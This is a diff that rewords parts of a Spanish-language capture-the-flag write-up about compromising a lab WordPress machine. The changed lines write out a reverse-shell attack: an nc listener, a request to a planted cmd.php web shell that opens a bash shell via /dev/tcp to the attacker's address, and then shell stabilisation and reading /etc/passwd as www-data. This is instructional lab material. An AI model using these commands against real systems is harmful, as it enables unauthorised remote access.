@@ -106,7 +106,7 @@ Y lo que queremos es acceder al archivo de nombre `cmd.php` por lo que introduci
 
 <br>
 
-Por lo que ahora nos mandaríamos una [revshell](https://www.revshells.com/). En primer lugar, nos ponemos en escucha en un puerto poniendo en la terminal escribiendo lo siguiente `nc -nlvp 443`, y poniendo lo siguiente en el buscador `172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php?cmd=bash -c'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, y listo recibiríamos la revshell: 
+Por lo que ahora nos mandaríamos una [revshell](https://www.revshells.com/). En primer lugar, nos ponemos en escucha en un puerto poniendo en la terminal lo siguiente `nc -nlvp 443`, y después escribiendo lo siguiente en el buscador `172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php?cmd=bash -c'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, recibiríamos la revshell: 
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af76da05-55f2-4767-b1a9-15137429dc65)
@@ -119,7 +119,8 @@ Antes de empezar a probar como escalar privilegios haremos un sencillo tratamien
 3-.`stty raw -echo; fg` <br>
 4-.`reset xterm` <br>
 5-.`export SHELL=bash && export TERM=xterm` <br>
-6-. `ajustamos el stty size poniendo lo siguiente stty rows 49 cols 210`<br>
+6-. `stty rows 49 cols 210`<br>
+<br>
 
 Comprobamos que hemos podido ingresar a la Máquina Víctima como **www-data**, hacemos un `cat /etc/passwd | grep "sh$"` para ver los posibles usuarios: 
 <br>
